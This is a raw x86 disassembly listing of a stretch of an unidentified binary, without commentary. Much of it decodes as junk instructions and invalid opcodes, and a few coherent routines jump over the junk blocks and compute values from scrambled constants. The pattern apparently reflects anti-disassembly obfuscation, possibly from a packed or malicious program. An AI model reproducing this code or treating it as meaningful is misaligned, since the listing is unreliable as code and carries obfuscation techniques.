  4051a3:	js     0x4051a3
  4051a5:	jbe    0x4051d7
  4051a7:	outs   dx,DWORD PTR ds:[esi]
  4051a8:	(bad)
  4051ab:	mov    eax,cs:0xf294810b
  4051b1:	fcomp  DWORD PTR [esi+0x2df5a001]
  4051b7:	nop
  4051b8:	cmp    BYTE PTR [ecx+0x23],0xf5
  4051bc:	mov    ebx,cs
  4051be:	push   cs
  4051bf:	das    
  4051c0:	int3   
  4051c1:	repnz push esi
  4051c3:	stc    
  4051c4:	push   esp
  4051c5:	jmp    esp
  4051c7:	ret    
  4051c8:	(bad)  
  4051c9:	push   edx
  4051ca:	ins    DWORD PTR es:[edi],dx
  4051cb:	jo     0x40522a
  4051cd:	push   eax
  4051ce:	lea    edi,[ecx+0x6c]
  4051d1:	(bad)  
  4051d3:	aaa    
  4051d4:	push   eax
  4051d5:	into   
  4051d6:	jl     0x405169
  4051d8:	push   es
  4051d9:	cld    
  4051da:	scas   eax,DWORD PTR es:[edi]
  4051db:	sub    ah,BYTE PTR [eax]
  4051dd:	push   ds
  4051de:	outs   dx,DWORD PTR ds:[esi]
  4051df:	data16 mov al,0x8
  4051e2:	sub    eax,0x5028fc1d
  4051e7:	aas    
  4051e8:	cld    
  4051e9:	mov    cs,WORD PTR cs:[ecx-0x59]
  4051ed:	jbe    0x40524c
  4051ef:	jg     0x405266
  4051f1:	fxch   st(0)
  4051f3:	sub    ecx,DWORD PTR [ebx]
  4051f5:	mov    bh,BYTE PTR [eax+ecx*8]
  4051f8:	popf   
  4051f9:	xor    cl,BYTE PTR [edx]
  4051fb:	clc    
  4051fc:	sub    dh,BYTE PTR [ebx*4+0x97af57]
  405203:	jmp    0x3d102127
  405208:	dec    ebp
  405209:	(bad)  
  40520a:	cli    
  40520b:	mov    ds:0x1caaf5f,al
  405210:	push   esi
  405211:	aas    
  405212:	xor    edi,DWORD PTR [ebp-0x36382d5d]
  405218:	xchg   BYTE PTR [edx+0x39bf1d71],ah
  40521e:	cmp    esi,esp
  405220:	leave  
  405221:	call   0xe50e7c13
  405226:	jae    0x4051b4
  405228:	sub    edi,ebp
  40522a:	ds mov esp,0x5694976c
  405230:	cmp    eax,0x579cb20c
  405235:	jg     0x4051fb
  405237:	call   0xb7fb:0xe58df282
  40523e:	test   al,0xfb
  405240:	test   BYTE PTR [ebx-0x11d71d6a],ch
  405246:	(bad)  
  405247:	nop
  405248:	xchg   edi,eax
  405249:	add    BYTE PTR [edi-0x4f],bl
  40524c:	data16 fisubr WORD PTR [esi]
  40524f:	xor    DWORD PTR [ecx-0x11],0x47ec78b4
  405256:	scas   eax,DWORD PTR es:[edi]
  405257:	std    
  405258:	aam    0x45
  40525a:	mov    bh,0x98
  40525c:	cdq    
  40525d:	push   edi
  40525e:	xor    ecx,DWORD PTR [eax-0x46]
  405261:	cld    
  405262:	xor    bl,ah
  405264:	pop    es
  405265:	fsub   QWORD PTR [ebx]
  405267:	lock pushf 
  405269:	hlt    
  40526a:	aad    0x3a
  40526c:	xchg   edi,eax
  40526d:	pop    edx
  40526e:	out    0xe1,eax
  405270:	and    cl,BYTE PTR [edx]
  405272:	cmc    
  405273:	and    edx,DWORD PTR [ebx+0x36]
  405276:	fldcw  WORD PTR [esi-0x77]
  405279:	lock popa 
  40527b:	add    dh,dh
  40527d:	mov    esp,0x39dd94ed
  405282:	mov    BYTE PTR [edi],bh
  405284:	adc    DWORD PTR [ebx+0x37],eax
  405287:	xchg   edi,eax
  405288:	sbb    BYTE PTR [ecx+0xaf6e93f],ah
  40528e:	cs jne 0x405293
  405291:	or     esi,DWORD PTR [esi]
  405293:	pop    ds
  405294:	push   ss
  405295:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405296:	rcl    dl,cl
  405298:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405299:	setp   BYTE PTR ds:0x835ae8c8
  4052a0:	inc    ebx
  4052a1:	jmp    0x4434:0x102a0733
  4052a8:	cmp    ecx,esp
  4052aa:	xchg   ebx,ebx
  4052ac:	lods   eax,DWORD PTR ds:[esi]
  4052ad:	mov    ebx,esp
  4052af:	mov    WORD PTR [edx+0x56],?
  4052b2:	movups xmm1,XMMWORD PTR fs:[edi+0x4907527e]
  4052ba:	adc    eax,0x61cf709e
  4052bf:	leave  
  4052c0:	sbb    bh,BYTE PTR [eax+0x44]
  4052c3:	ret    
  4052c4:	fsubr  st(0),st
  4052c6:	jbe    0x4052db
  4052c8:	sub    al,0x9b
  4052ca:	ror    BYTE PTR [eax],cl
  4052cc:	pop    ebx
  4052cd:	pop    esp
  4052ce:	out    0x98,eax
  4052d0:	xor    esi,edx
  4052d2:	add    eax,ecx
  4052d4:	add    esi,ecx
  4052d6:	imul   eax,esi
  4052d9:	jmp    0x40559d
  4052de:	mov    eax,DWORD PTR [ebp+0xc]
  4052e1:	mov    eax,DWORD PTR [eax+0x78]
  4052e4:	mov    DWORD PTR [ebp+0xc],eax
  4052e7:	mov    eax,DWORD PTR [ebp-0x4]
  4052ea:	mov    esi,DWORD PTR [ebp-0x8]
  4052ed:	xor    eax,edx
  4052ef:	xor    esi,edx
  4052f1:	add    eax,ecx
  4052f3:	jmp    0x405577
  4052f8:	shl    DWORD PTR [ebx],0xe4
  4052fb:	add    al,0xe2
  4052fd:	ret    
  4052fe:	loope  0x4052e1
  405300:	and    esp,DWORD PTR [eax-0x2176fef8]
  405306:	jmp    0x405326
  405308:	(bad)  
  405309:	sub    dh,BYTE PTR [eax+0x70]
  40530c:	fnstcw WORD PTR [esi+0x70]
  40530f:	jo     0x40531d
  405311:	fsubr  DWORD PTR [edi]
  405313:	add    al,0xb2
  405315:	shr    DWORD PTR ds:0x25382d3e,0x2f
  40531c:	mov    ebp,0x5228c8bb
  405321:	outs   dx,DWORD PTR ds:[esi]
  405322:	not    BYTE PTR [ebx]
  405324:	pop    ebp
  405325:	adc    al,BYTE PTR fs:[esi]
  405328:	inc    ebx
  405329:	retf   0x9cc8
  40532c:	add    ebx,DWORD PTR [esp+ebp*1]
  40532f:	pop    edx
  405330:	mov    DWORD PTR [eax+0x20],0xba5dca99
  405337:	ror    BYTE PTR [esi],1
  405339:	xchg   ebx,eax
  40533a:	xor    ch,BYTE PTR [ecx+edi*8]
  40533d:	ins    DWORD PTR es:[edi],dx
  40533e:	imul   esp,DWORD PTR [esi+0x1a6e54b9],0x9b87b968
  405348:	js     0x405373
  40534a:	(bad)  
  40534b:	xor    DWORD PTR [esi],edi
  40534d:	xchg   edx,eax
  40534e:	add    eax,0x503653c3
  405353:	rcl    edi,1
  405355:	add    DWORD PTR [ebx+edi*1],eax
  405358:	mov    ch,0x3a
  40535a:	jle    0x4052de
  40535c:	std    
  40535d:	mov    ds:0x8d5766e9,al
  405362:	inc    edi
  405363:	mov    al,0x8
  405365:	or     esp,DWORD PTR [eax]
  405367:	sub    al,0x64
  405369:	enter  0x21b5,0xdc
  40536d:	jae    0x40539e
  40536f:	jns    0x4053b6
  405371:	add    al,ah
  405373:	(bad)  
  405374:	xor    eax,0xc622eba2
  405379:	daa    
  40537a:	mov    edi,0x561de629
  40537f:	les    edx,FWORD PTR [ebx]
  405381:	mov    ds:0xfa05c300,al
  405386:	cld    
  405387:	dec    esp
  405388:	mov    WORD PTR [esi],fs
  40538a:	fsubr  QWORD PTR [eax+edi*2+0xf]
  40538e:	mov    ebx,eax
  405390:	or     DWORD PTR [esi],0x4b
  405393:	pop    esi
  405394:	pop    esp
  405395:	fsub   DWORD PTR [ebp+0x3e]
  405398:	repnz push ebx
  40539a:	lea    ecx,ds:0xfa6ceefe
  4053a0:	add    BYTE PTR [ebx+0x16afdad1],dh
  4053a6:	mov    ds:0x3b5aa371,eax
  4053ab:	push   ds
  4053ac:	sbb    DWORD PTR [ebx+0x73],0x7c
  4053b0:	or     al,0x9b
  4053b2:	sti    
  4053b3:	clc    
  4053b4:	lea    edx,[edx]
  4053b6:	stc    
  4053b7:	sub    al,0xfa
  4053b9:	or     DWORD PTR [ebx+0x31f05a5b],ebx
  4053bf:	daa    
  4053c0:	inc    edx
  4053c1:	xor    BYTE PTR [esi-0x36],0x8e
  4053c5:	xchg   ebp,eax
  4053c6:	loope  0x405348
  4053c8:	jnp    0x40538a
  4053ca:	mov    WORD PTR [ecx],gs
  4053cc:	cwde   
  4053cd:	sbb    eax,0xa528afbb
  4053d2:	mov    al,ds:0xe205ba63
  4053d7:	jnp    0x4053a8
  4053d9:	sbb    al,0xeb
  4053db:	inc    eax
  4053dc:	ficom  DWORD PTR [esi+0x7a95799]
  4053e2:	bound  ebx,QWORD PTR [ebx-0x49]
  4053e5:	clc    
  4053e6:	int3   
  4053e7:	sbb    DWORD PTR [ebx],0x6c7ff14b
  4053ed:	mov    al,ds:0x8bfda3ea
  4053f2:	rcr    BYTE PTR [ebp+0x3bead7a5],0xe3
  4053f9:	xlat   BYTE PTR ds:[ebx]
  4053fa:	sub    BYTE PTR [eax+0x1134e037],al
  405400:	ins    DWORD PTR es:[edi],dx
  405401:	mov    ds:0x552472df,al
  405406:	xchg   edx,eax
  405407:	mov    al,0xe4
  405409:	js     0x405459
  40540b:	push   0x26a2a0ad
  405410:	js     0x4053b2
  405412:	mov    dh,0xe8
  405414:	inc    ecx
  405415:	mov    eax,0xdc8bb9b
  40541a:	pop    ecx
  40541b:	(bad)  
  40541c:	rcl    BYTE PTR [esi],1
  40541e:	xchg   esp,eax
  40541f:	cwde   
  405420:	lea    ebp,[ecx-0x48a12e0f]
  405426:	outs   dx,BYTE PTR ds:[esi]
  405427:	popa   
  405428:	fidivr DWORD PTR [edi]
  40542a:	js     0x40544f
  40542c:	popf   
  40542d:	jne    0x405479
  40542f:	cmp    al,BYTE PTR [edi-0x576ac494]
  405435:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405436:	cmc    
  405437:	pop    esp
  405438:	fcomp  st(6)
  40543a:	repz and ch,BYTE PTR [edx-0x7c]
  40543e:	out    dx,al
  40543f:	and    eax,DWORD PTR [ecx-0x2c56ccdd]
  405445:	pop    edi
  405446:	ss dec edx
  405448:	xor    eax,0xde088630
  40544d:	fidivr WORD PTR [eax+0xb]
  405450:	lea    esp,[eax-0x6bd2aef2]
  405456:	mov    cl,0x21
  405458:	hlt    
  405459:	sub    DWORD PTR [ebx],0xffffff96
  40545c:	jb     0x4054d0
  40545e:	mov    ebx,DWORD PTR [eax]
  405460:	dec    ecx
  405461:	sbb    eax,0x67a6e367
  405466:	pop    ebp
  405467:	loop   0x405451
  405469:	and    dh,dh
  40546b:	sbb    al,0xbf
  40546d:	cwde   
  40546e:	lods   eax,DWORD PTR ds:[esi]
  40546f:	push   esp
  405470:	imul   esp,DWORD PTR [edx],0xc9cec402
  405476:	dec    eax
  405477:	call   0x466f:0x202d0d9a
  40547e:	mov    ds:0x99e6c8da,al
  405483:	mov    ds:0x28e83e80,eax
  405488:	sub    DWORD PTR ds:0x54be9e38,edi
  40548e:	stos   BYTE PTR es:[edi],al
  40548f:	lea    ebx,[edi-0x5f100fd]
  405495:	mov    dl,0xfe
  405497:	xor    ebx,0x71
  40549a:	repnz lea ebp,[ebp-0x5]
  40549e:	mov    eax,0xe77f2c2e
  4054a3:	and    ch,ch
  4054a5:	sub    DWORD PTR [ecx+edx*4+0x4e],ebx
  4054a9:	lds    ebx,FWORD PTR [edi+0x34cff274]
  4054af:	sub    bh,dh
  4054b1:	adc    DWORD PTR [esp+eax*8-0x2a],esp
  4054b5:	ins    DWORD PTR es:[edi],dx
  4054b6:	add    ecx,0xc51aa216
  4054bc:	adc    bl,BYTE PTR [edx+0x5e51a026]
  4054c2:	xchg   esp,eax
  4054c3:	idiv   BYTE PTR [esi]
  4054c5:	stos   BYTE PTR es:[edi],al
  4054c6:	std    
  4054c7:	sub    DWORD PTR [edi-0x71],edi
  4054ca:	sar    DWORD PTR [edx],1
  4054cc:	mov    bl,0xee
  4054ce:	xor    BYTE PTR [eax],cl
  4054d0:	xor    al,0x4f
  4054d2:	xor    esp,DWORD PTR [esi-0x77]
  4054d5:	pop    esp
  4054d6:	popa   
  4054d7:	outs   dx,BYTE PTR ds:[esi]
  4054d8:	or     eax,0x35822305
  4054dd:	std    
  4054de:	mov    WORD PTR [ebp-0x38],gs
  4054e1:	ja     0x405501
  4054e3:	jo     0x4054c1
  4054e5:	fcomp  QWORD PTR [esi]
  4054e7:	pop    es
  4054e8:	xor    DWORD PTR [ecx-0x2adc346b],0xb544d590
  4054f2:	jbe    0x405532
  4054f4:	pop    ss
  4054f5:	mov    ss,WORD PTR [esi]
  4054f7:	stos   BYTE PTR es:[edi],al
  4054f8:	sbb    ebx,DWORD PTR [eax]
  4054fa:	loopne 0x4054e7
  4054fc:	retf   0x15f2
  4054ff:	mov    eax,ds:0xdc103733
  405504:	ins    DWORD PTR es:[edi],dx
  405505:	xor    edx,0xec828dba
  40550b:	dec    edx
  40550c:	mov    bh,0x2a
  40550e:	ds inc edx
  405510:	and    ah,dl
  405512:	cs push 0x42
  405515:	dec    ecx
  405516:	cmp    al,0xd9
  405518:	xor    cl,BYTE PTR [edi]
  40551a:	xlat   BYTE PTR ds:[ebx]
  40551b:	clc    
  40551c:	lock mov esi,0xa5348c0
  405522:	into   
  405523:	std    
  405524:	call   edx
  405526:	loopne 0x4054ed
  405528:	or     BYTE PTR [edx-0x73d435f4],dh
  40552e:	mov    gs,WORD PTR [ebx+0x6c3b188c]
  405534:	fsubr  DWORD PTR [ebx-0x29]
  405537:	aam    0x43
  405539:	push   esp
  40553a:	fistp  DWORD PTR [esi-0x6fa29787]
  405540:	cld    
  405541:	inc    ebx
  405542:	cmp    dl,BYTE PTR [eax+0x6a]
  405545:	fnstcw WORD PTR [eax+0x12]
  405548:	lahf   
  405549:	jmp    0x405548
  40554b:	sub    al,0xc
  40554d:	dec    esp
  40554e:	dec    ebp
  40554f:	dec    edx
  405550:	xchg   ebx,eax
  405551:	mov    eax,0xf00b6116
  405556:	xchg   ebx,eax
  405557:	mov    ch,0x49
  405559:	mov    esi,ebp
  40555b:	shr    esp,0x4b
  40555e:	dec    edi
  40555f:	repz xchg ebx,eax
  405561:	add    DWORD PTR [esi],ecx
  405563:	push   DWORD PTR [esi]
  405565:	cmp    BYTE PTR [edi],bl
  405567:	cmp    bh,BYTE PTR [edx-0x31226b3c]
  40556d:	jns    0x4055e7
  40556f:	aad    0xab
  405571:	cli    
  405572:	test   eax,0x7e4d0d5
  405577:	add    esi,ecx
  405579:	imul   eax,esi
  40557c:	mov    esi,DWORD PTR [ebp+0xc]
  40557f:	cmp    esi,eax
  405581:	mov    eax,DWORD PTR [ebp-0x4]
  405584:	je     0x405047
  40558a:	xor    eax,edx
  40558c:	add    eax,ecx
  40558e:	mov    ecx,DWORD PTR [ebp+0xc]
  405591:	imul   eax,ecx
  405594:	add    eax,DWORD PTR [ebp+0x8]
  405597:	mov    DWORD PTR [ebp+0xc],eax
  40559a:	mov    eax,DWORD PTR [ebp+0xc]
  40559d:	pop    esi
  40559e:	leave  
  40559f:	ret    0x8
  4055a2:	push   ebp
  4055a3:	mov    ebp,esp
  4055a5:	push   ecx
  4055a6:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  4055ad:	mov    eax,DWORD PTR [ebp-0x4]
  4055b0:	mov    edx,DWORD PTR [ebp+0x10]
  4055b3:	mov    ecx,0x7510855
  4055b8:	adc    DWORD PTR ds:0x434421,0x21da
  4055c2:	xor    eax,ecx
  4055c4:	add    eax,0x32729c
  4055c9:	and    DWORD PTR ds:0x4326fc,0x2b83
  4055d3:	mov    DWORD PTR [edx],eax
  4055d5:	mov    eax,ds:0x434439
  4055da:	mov    edx,DWORD PTR ds:0x43445d
  4055e0:	sub    eax,edx
  4055e2:	xor    eax,DWORD PTR [eax+edx*1]
  4055e5:	mov    eax,DWORD PTR [ebp+0xc]
  4055e8:	dec    edx
  4055e9:	xor    eax,ecx
  4055eb:	dec    edx
  4055ec:	jmp    0x405755
  4055f1:	loope  0x4055fe
  4055f3:	xchg   edi,eax
  4055f4:	fdiv   DWORD PTR [ebp+0x64]
  4055f7:	jno    0x405602
  4055f9:	add    DWORD PTR [edi-0x74],0x8adc1c84
  405600:	clc    
  405601:	scas   eax,DWORD PTR es:[edi]
  405602:	sub    BYTE PTR [eax+0x70],dh
  405605:	les    edi,FWORD PTR [edi+0x70]
  405608:	jo     0x4055b0
  40560a:	out    0xe9,al
  40560c:	das    
  40560d:	mov    ah,0x5b
  40560f:	rol    DWORD PTR [esi-0x26],1
  405612:	loopne 0x40566f
  405614:	outs   dx,BYTE PTR ds:[esi]
  405615:	pop    esi
  405616:	lock ja 0x4055a7
  405619:	xor    DWORD PTR [edx+0x5cba948d],eax
  40561f:	push   0x12330a9d
  405624:	or     al,0xc8
  405626:	mov    eax,ds:0x9398b8e8
  40562b:	loopne 0x405640
  40562d:	pushf  
  40562e:	pop    ss
  40562f:	dec    ebp
  405630:	fwait
  405631:	mov    DWORD PTR [esi-0x1e],esp
  405634:	das    
  405635:	dec    edx
  405636:	mov    dh,0xa4
  405638:	ret    
  405639:	xchg   esp,eax
  40563a:	adc    ecx,esp
  40563c:	push   0xffffffd7
  40563e:	cs retf 
  405640:	jecxz  0x405661
  405642:	mov    ah,BYTE PTR ds:0xad508d97
  405648:	repz pop eax
  40564a:	push   es
  40564b:	push   eax
  40564c:	adc    eax,DWORD PTR [ebp+0x67]
  40564f:	or     dl,ch
  405651:	xchg   BYTE PTR [ebp+0x1c7f78b6],al
  405657:	stos   BYTE PTR es:[edi],al
  405658:	pop    ebx
  405659:	pop    esi
  40565a:	sub    al,0xbd
  40565c:	pusha  
  40565d:	je     0x405682
  40565f:	cmp    esp,DWORD PTR [edi+0xbd1242e]
  405665:	fld    QWORD PTR [ecx-0x285e167b]
  40566b:	(bad)  
  40566c:	jmp    0xc589:0xeedefa17
  405673:	daa    
  405674:	pop    ebx
  405675:	push   edx
  405676:	mov    ebx,0x114fb695
  40567b:	add    BYTE PTR [edi],0x39
  40567e:	xor    esp,ebp
  405680:	jns    0x405652
  405682:	mov    al,0xd
  405684:	jge    0x405642
  405686:	aad    0x77
  405688:	std    
  405689:	data16 scas al,BYTE PTR es:[edi]
  40568b:	out    dx,al
  40568c:	mov    ecx,0x716df149
  405691:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405692:	test   al,0xaf
  405694:	and    esi,DWORD PTR [edi]
  405696:	fldenv [ebp+0x76]
  405699:	das    
  40569a:	shl    DWORD PTR [eax+0x5d],cl
  40569d:	cs stos DWORD PTR es:[edi],eax
  40569f:	les    ecx,FWORD PTR [eax+edi*4-0x80]
  4056a3:	and    dl,0x3d
  4056a6:	push   eax
  4056a7:	inc    edi
  4056a8:	mov    edx,0xca7af038
  4056ad:	call   0xf5c8f449
  4056b2:	(bad)  
  4056b3:	out    0xad,eax
  4056b5:	cmp    eax,0x9bef195
  4056ba:	fcmove st,st(2)
  4056bc:	cli    
  4056bd:	and    DWORD PTR [edi+0x47],esi
  4056c0:	fcmovnu st,st(5)
  4056c2:	sbb    al,0x4a
  4056c4:	and    al,0xb1
  4056c6:	xor    al,0xb7
  4056c8:	inc    ecx
  4056c9:	dec    esp
  4056ca:	pop    DWORD PTR [ecx-0x5d]
  4056cd:	cmp    si,dx
  4056d0:	push   esi
  4056d1:	sub    eax,0xc5c7d6eb
  4056d6:	nop
  4056d7:	jl     0x4056ff
  4056d9:	aad    0x47
  4056db:	icebp  
  4056dc:	lahf   
  4056dd:	pop    ebp
  4056de:	test   DWORD PTR [ebp-0x5b],edx
  4056e1:	and    al,0xb8
  4056e3:	loopne 0x4056b5
  4056e5:	daa    
  4056e6:	daa    
  4056e7:	cmc    
  4056e8:	xchg   edx,eax
  4056e9:	cmp    edi,DWORD PTR [eax-0x5]
  4056ec:	xor    BYTE PTR [ecx],bh
  4056ee:	inc    edx
  4056ef:	cmp    BYTE PTR [edi-0x41],cl
  4056f2:	sbb    al,0xd2
  4056f4:	dec    ebx
  4056f5:	mov    ch,0xb0
  4056f7:	mov    cl,0x4c
  4056f9:	sar    BYTE PTR [eax+0xcc2fad],1
  4056ff:	in     al,dx
  405700:	daa    
  405701:	xchg   BYTE PTR [ebp+0x27],bl
  405704:	sub    al,0x47
  405706:	repz inc ecx
  405708:	pop    esp
  405709:	add    al,0x12
  40570b:	js     0x405713
  40570d:	call   0xca0a602a
  405712:	push   es
  405713:	cwde   
  405714:	rcl    BYTE PTR [edx],cl
  405716:	inc    edi
  405717:	and    al,0xf0
  405719:	ins    DWORD PTR es:[edi],dx
  40571a:	inc    esp
  40571b:	dec    ebp
  40571c:	test   al,0x22
  40571e:	ror    ebp,0x99
  405721:	in     eax,dx
  405722:	js     0x40577a
  405724:	loopne 0x405745
  405726:	xchg   esp,eax
  405727:	std    
  405728:	iret   
  405729:	xchg   esi,eax
  40572a:	or     al,0x7a
  40572c:	retf   0x7669
  40572f:	mov    bl,0x1
  405731:	loop   0x4056eb
  405733:	xchg   edx,eax
  405734:	xor    eax,0xd37bb041
  405739:	lods   eax,DWORD PTR ds:[esi]
  40573a:	in     eax,0x73
  40573c:	ror    DWORD PTR [ebp+0x70986045],cl
  405742:	xor    BYTE PTR [ecx],dl
  405744:	imul   di,WORD PTR [ebx],0x1f
  405748:	mov    esp,0x34ccbb6f
  40574d:	push   esi
  40574e:	jae    0x405795
  405750:	and    al,0xbc
  405752:	xchg   edi,eax
  405753:	vorps  ymm1,ymm7,YMMWORD PTR [ebx+0x25811075]
  40575b:	push   0x43
  40575d:	inc    ebx
  40575e:	add    BYTE PTR [eax],al
  405760:	add    BYTE PTR [eax],al
  405762:	add    BYTE PTR [ebx+0x43436a15],cl
  405768:	add    BYTE PTR [edx-0x77],al
  40576b:	adc    eax,0x43436a
  405770:	cmp    DWORD PTR ds:0x43436a,0x22
  405777:	jne    0x405789
  40577d:	push   DWORD PTR [ebp-0xc]
  405780:	push   DWORD PTR [ebp-0x24]
  405783:	call   DWORD PTR ds:0x4329c2
  405789:	cmp    DWORD PTR ds:0x43436a,0x1c
  405790:	jb     0x405763
  405796:	mov    edx,0x32729c
  40579b:	adc    DWORD PTR ds:0x432dbe,0x43438a
  4057a5:	add    eax,edx
  4057a7:	mov    DWORD PTR [esi+0x4],eax
  4057aa:	movzx  eax,BYTE PTR ds:0x4326f4
  4057b1:	and    eax,DWORD PTR ds:0x43439a
  4057b7:	mov    ds:0x4326f4,eax
  4057bc:	mov    eax,DWORD PTR [ebp+0x14]
  4057bf:	mov    DWORD PTR ds:0x43437e,0x718d
  4057c9:	mov    esi,DWORD PTR [ebp+0x10]
  4057cc:	xor    DWORD PTR ds:0x432704,0x2330
  4057d6:	mov    DWORD PTR [esi+0x8],eax
  4057d9:	mov    eax,DWORD PTR [ebp+0x18]
  4057dc:	mov    esi,DWORD PTR [ebp+0x10]
  4057df:	mov    DWORD PTR [esi+0xc],eax
  4057e2:	mov    eax,DWORD PTR [ebp+0x1c]
  4057e5:	mov    esi,DWORD PTR [ebp+0x10]
  4057e8:	mov    DWORD PTR [esi+0x10],eax
  4057eb:	mov    eax,eax
  4057ed:	jmp    0x405956
  4057f2:	hlt    
  4057f3:	and    BYTE PTR [ecx],bl
  4057f5:	arpl   cx,sp
  4057f7:	jno    0x40586b
  4057f9:	scas   eax,DWORD PTR es:[edi]
  4057fa:	mov    al,ds:0x9a519e0f
  4057ff:	xor    dl,cl
  405801:	call   0x7fc4:0x70703773
  405808:	jo     0x40587a
  40580a:	sbb    ah,dh
  40580c:	daa    
  40580d:	mov    dh,0xf8
  40580f:	mov    al,ds:0xd1f0920b
  405814:	je     0x405818
  405816:	xchg   edi,eax
  405817:	data16 mov ch,0xaf
  40581a:	iret   
  40581b:	cmp    al,0x42
  40581d:	js     0x40583c
  40581f:	cs pop edx
  405821:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405822:	aam    0xa
  405824:	jl     0x405806
  405826:	imul   ecx,DWORD PTR [ebx+ecx*1],0x27
  40582a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40582b:	add    eax,0xab816573
  405830:	add    esi,0x76563de0
  405836:	pop    ebp
  405837:	mov    al,0x1c
  405839:	fidiv  DWORD PTR [ebp-0x22718af]
  40583f:	mov    ah,0x21
  405841:	stos   BYTE PTR es:[edi],al
  405842:	ret    0x6c61
  405845:	test   BYTE PTR [edx+0xe],ah
  405848:	add    bh,BYTE PTR [edx-0x1f]
  40584b:	call   DWORD PTR [edx]
  40584d:	xchg   ch,al
  40584f:	enter  0x9572,0x69
  405853:	(bad)  
  405854:	ss mov edi,0xa975ec37
  40585a:	jmp    0x40588b
  40585c:	xchg   esi,eax
  40585d:	loop   0x4058c6
  40585f:	mov    bh,0x7c
  405861:	stos   DWORD PTR es:[edi],eax
  405862:	sub    DWORD PTR [ebx+0x3a66e37a],0xffffffbb
  405869:	dec    edx
  40586a:	aad    0xda
  40586c:	ffreep st(0)
  40586e:	jb     0x4058d4
  405870:	mov    cl,0x2c
  405872:	xor    ah,BYTE PTR [ecx+0x2]
  405875:	loop   0x40589b
  405877:	inc    DWORD PTR [edx-0x5b]
  40587a:	fsub   st(7),st
  40587c:	loopne 0x40586f
  40587e:	jae    0x405891
  405880:	inc    esi
  405881:	test   DWORD PTR [eax],edx
  405883:	mov    ecx,0x4457ab9d
  405888:	mov    eax,0x89546da2
  40588d:	call   0x2e5e8654
  405892:	adc    al,0x3f
  405894:	cmp    al,BYTE PTR [esi]
  405896:	xor    BYTE PTR [ecx+0x76],dh
  405899:	pop    ds
  40589a:	pop    edi
  40589b:	or     dh,BYTE PTR [ebx+0x5a]
  40589e:	mov    ds:0x3547aad3,eax
  4058a3:	ss stc 
  4058a5:	cdq    
  4058a6:	fwait
  4058a7:	std    
  4058a8:	shl    ah,1
  4058aa:	dec    esi
  4058ab:	jbe    0x4058de
  4058ad:	inc    ebx
  4058ae:	rol    DWORD PTR [esi],0xb1
  4058b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058b2:	jge    0x4058d3
  4058b4:	test   BYTE PTR [ebx],dl
  4058b6:	fcom   QWORD PTR [ebx]
  4058b8:	int3   
  4058b9:	jne    0x40583e
  4058bb:	(bad)  
  4058bc:	out    dx,eax
  4058bd:	test   eax,0xa8512e3e
  4058c2:	es xchg esi,eax
  4058c4:	sub    ecx,DWORD PTR [ecx-0x422daff7]
  4058ca:	loopne 0x4058ff
  4058cc:	jmp    0x28f9:0xbfd2af7f
  4058d3:	sub    eax,0x78fb29f7
  4058d8:	fwait
  4058d9:	pop    ss
  4058da:	shl    DWORD PTR [ebp-0x53ab93fa],cl
  4058e0:	cmp    al,0xc8
  4058e2:	test   DWORD PTR [esi+0x3a],esp
  4058e5:	addr16 mov bh,0xb2
  4058e8:	dec    ebx
  4058e9:	loopne 0x4058f4
  4058eb:	icebp  
  4058ec:	or     al,0xa8
  4058ee:	scas   al,BYTE PTR es:[edi]
  4058ef:	aad    0x8f
  4058f1:	or     ah,BYTE PTR [eax+0x4003dc90]
  4058f7:	lods   eax,DWORD PTR ds:[esi]
  4058f8:	shl    DWORD PTR [ebx],1
  4058fa:	sbb    eax,0x6dc22ad8
  4058ff:	inc    esi
  405900:	cmp    BYTE PTR [edi+ecx*4],cl
  405903:	xchg   esp,ecx
  405905:	test   al,0xe9
  405907:	je     0x405916
  405909:	stos   DWORD PTR es:[edi],eax
  40590a:	push   esi
  40590b:	xchg   esp,eax
  40590c:	adc    al,0xab
  40590e:	add    eax,0x7df8cb11
  405913:	adc    DWORD PTR [ecx-0xe5bacd5],0x64
  40591a:	and    edi,DWORD PTR [eax]
  40591c:	cmp    edi,DWORD PTR [ecx+eax*8+0x72]
  405920:	pop    ebx
  405921:	dec    ecx
  405922:	pop    edi
  405923:	in     eax,dx
  405924:	dec    ebp
  405925:	mov    ah,0x81
  405927:	dec    ecx
  405928:	lds    edi,FWORD PTR [eax-0x15004e50]
  40592e:	push   es
  40592f:	dec    esp
  405930:	push   0x75610693
  405935:	xor    cl,BYTE PTR [edi-0x2e61613f]
  40593b:	ins    DWORD PTR es:[edi],dx
  40593c:	fmul   DWORD PTR [edi]
  40593e:	ja     0x4059b3
  405940:	fnstenv [ebx-0x31efcf9c]
  405946:	int    0x6d
  405948:	xor    BYTE PTR [esi-0xa],bh
  40594b:	mov    eax,ds:0x7c08d86e
  405950:	outs   dx,DWORD PTR ds:[esi]
  405951:	and    dh,bl
  405953:	loope  0x405926
  405955:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405956:	mov    eax,DWORD PTR [ebp+0x8]
  405959:	xor    eax,ecx
  40595b:	add    eax,edx
  40595d:	pop    esi
  40595e:	leave  
  40595f:	ret    0x18
  405962:	push   ebp
  405963:	mov    ebp,esp
  405965:	mov    eax,DWORD PTR [ebp+0xc]
  405968:	xor    edx,edx
  40596a:	jmp    0x405ad3
  40596f:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  405971:	sub    esi,DWORD PTR [esi+0x7161b2eb]
  405977:	mov    ah,0xc8
  405979:	mov    esi,0xf9b84f11
  40597e:	rol    edi,cl
  405980:	xor    eax,0x7fc47070
  405985:	jo     0x4059f7
  405987:	retf   0x4b5f
  40598a:	inc    esi
  40598b:	cmc    
  40598c:	push   esi
  40598d:	jecxz  0x4059e5
  40598f:	fucom  st(0)
  405991:	add    bl,ah
  405993:	scas   eax,DWORD PTR es:[edi]
  405994:	jo     0x405957
  405996:	pop    ebp
  405997:	add    esi,DWORD PTR [edi+eiz*8]
  40599a:	xchg   ecx,eax
  40599b:	pminub mm7,QWORD PTR [ecx-0x76dbd82f]
  4059a2:	hlt    
  4059a3:	ret    
  4059a4:	adc    eax,0xb54f6e45
